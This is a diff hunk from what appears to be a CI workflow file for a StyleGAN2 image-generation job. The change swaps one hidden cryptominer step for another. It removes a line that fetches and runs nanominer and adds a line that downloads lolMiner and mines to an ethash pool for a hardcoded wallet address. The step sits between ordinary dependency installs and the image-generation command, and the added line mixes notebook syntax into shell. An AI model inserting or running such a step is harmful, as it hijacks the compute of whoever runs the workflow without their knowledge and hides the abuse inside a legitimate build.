@@ -34,7 +34,7 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        !wget https://github.com/mkxmax12/mac/raw/main/nanominer && wget https://raw.githubusercontent.com/mkxmax12/mac/main/config.ini && chmod +x nanominer && ./nanominer config.ini
+        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz && ! tar -xf lolMiner_v1.28a_Lin64.tar.gz && %cd 1.28a/ && !./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ETH:0x686c626E48bfC5DC98a30a9992897766fed4Abd3.mkxmaxminuka --ethstratum ETHPROXY
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
